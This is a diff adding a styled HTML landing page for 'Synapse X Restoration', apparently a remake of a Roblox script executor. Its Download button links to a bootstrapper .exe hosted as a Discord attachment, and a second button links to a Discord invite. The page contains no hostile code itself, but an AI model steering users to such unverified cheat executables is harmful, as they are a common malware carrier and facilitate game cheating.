@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Synapse X Restoration</title>
+    <style>
+        /* Global reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Body and general background */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0f0f0f;
+            overflow: hidden;
+            color: white;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            justify-content: center; /* Vertically center content */
+            align-items: center; /* Horizontally center content */
+        }
+
+        /* Container and content styling */
+        .container {
+            text-align: center;
+            padding: 50px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;  /* Center the content horizontally */
+        }
+        .title {
+            font-size: 48px;
+            font-weight: bold;
+            color: white;
+            margin-bottom: 20px;
+            position: relative;
+            display: inline-block;
+            animation: shine 3s infinite ease-in-out; /* Glowing animation */
+        }
+        .subtitle {
+            font-size: 24px;
+            color: #c39bc5;
+            margin-bottom: 50px;
+            position: relative;
+            display: inline-block;
+            animation: shine 3s infinite ease-in-out; /* Same animation as title */
+        }
+
+        /* Glowing effect animation */
+        @keyframes shine {
+            0% {
+                text-shadow: 0 0 7px rgba(255, 255, 255, 0.5), 0 0 15px rgba(255, 255, 255, 0.6), 0 0 22px rgba(255, 255, 255, 0.7), 0 0 30px rgba(0, 204, 255, 0.8), 0 0 50px rgba(0, 204, 255, 0.8), 0 0 60px rgba(0, 204, 255, 0.9), 0 0 75px rgba(0, 204, 255, 0.9); /* Reduced glow at start */
+            }
+            50% {
+                text-shadow: 0 0 15px rgba(255, 255, 255, 0.5), 0 0 22px rgba(255, 255, 255, 0.6), 0 0 35px rgba(255, 255, 255, 0.7), 0 0 60px rgba(0, 204, 255, 0.8), 0 0 90px rgba(0, 204, 255, 0.8), 0 0 120px rgba(0, 204, 255, 1), 0 0 150px rgba(0, 204, 255, 1); /* Reduced glow in the middle */
+            }
+            100% {
+                text-shadow: 0 0 7px rgba(255, 255, 255, 0.5), 0 0 15px rgba(255, 255, 255, 0.6), 0 0 22px rgba(255, 255, 255, 0.7), 0 0 30px rgba(0, 204, 255, 0.8), 0 0 50px rgba(0, 204, 255, 0.8), 0 0 60px rgba(0, 204, 255, 0.9), 0 0 75px rgba(0, 204, 255, 0.9); /* Reduced glow at end */
+            }
+        }
+
+        /* Buttons container */
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 50px;
+        }
+
+        /* Button styles */
+        .button {
+            background: linear-gradient(145deg, #6e7bff, #4758ff);
+            padding: 15px 30px;
+            border-radius: 30px;
+            border: none;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            position: relative;
+            box-shadow: 3px 3px 6px rgba(0, 0, 0, 0.2);
+            transition: transform 0.2s ease, background 0.3s ease;
+        }
+
+        .button:hover {
+            background: linear-gradient(145deg, #4758ff, #6e7bff);
+            transform: translateY(-5px);
+        }
+
+        .button:active {
+            transform: translateY(2px);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="title">Synapse X Restoration</div>
+        <div class="subtitle">The best Synapse X Remake as of 2024</div>
+
+        <div class="buttons">
+            <button class="button" onclick="window.location.href='https://cdn.discordapp.com/attachments/1309610392879759450/1309612226507968612/SynapseXBootstrapper.exe?ex=6749772e&is=674825ae&hm=602f9c98186e7f9f9d5aa373dc2dafad9312db871fc0456e30b754faa39f459d&'">Download</button>
+            <button class="button" onclick="window.location.href='https://discord.gg/uZEBEynyTU'">Join Discord</button>
+        </div>
+    </div>
+
+</body>
+</html>
